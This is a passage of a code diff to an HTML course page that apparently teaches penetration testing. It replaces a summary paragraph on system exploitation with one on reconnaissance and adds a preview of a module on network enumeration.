+        <li>• Analyze subdomain patterns and naming conventions</li>
       </ul>
     </div>
   </div>
 
   <h3 class="text-xl font-semibold text-slate-100 mb-4">Key Takeaways</h3>
   <p class="text-slate-300 mb-6">
-    System exploitation requires understanding vulnerabilities, exploit development, and post-exploitation techniques. This module covered exploitation frameworks like Metasploit, buffer overflow development, privilege escalation methods, and evasion techniques. Successful exploitation depends on thorough reconnaissance, proper tool selection, and careful execution. Always practice in authorized lab environments and understand the legal implications of exploitation techniques. Modern security controls like ASLR, DEP, and endpoint detection make exploitation more challenging, requiring sophisticated techniques and custom payload development.
+    Effective reconnaissance is the foundation of successful penetration testing. This module covered passive and active information gathering techniques that help you understand the target environment before launching attacks. Remember that thorough reconnaissance often reveals more vulnerabilities than automated scanning tools. The intelligence gathered during this phase directly influences the success of subsequent testing phases. Always document your findings systematically and correlate information from multiple sources for maximum effectiveness.
   </p>
+
+  <div class="bg-gradient-to-r from-slate-800 to-slate-700 rounded-lg p-6 border border-slate-600">
+    <h4 class="text-lg font-semibold text-slate-100 mb-3">🔍 Next: Network Enumeration</h4>
+    <p class="text-slate-300">
+      Module 7 focuses on network enumeration and scanning techniques to discover live hosts, open ports, and running services in the target environment.
+    </p>
+  </div>
 </div>
